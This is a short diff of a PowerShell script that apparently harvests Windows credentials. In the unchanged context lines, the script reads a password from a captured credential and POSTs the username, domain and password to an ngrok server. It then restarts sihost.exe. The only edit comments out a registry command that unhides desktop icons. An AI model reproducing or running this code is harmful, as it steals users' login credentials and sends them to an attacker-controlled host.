@@ -33,7 +33,7 @@ while ( $cnt -lt '1000000000' ) {
             $pass = $credential.GetNetworkCredential().password;
             $username = "Username: ";
 	    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $username$domain"\"$user" `nPassword: "$pass"`n" -ErrorAction Ignore
-            REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 0 /f
+            #REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 0 /f
             powershell /c start sihost.exe
 	    exit
         
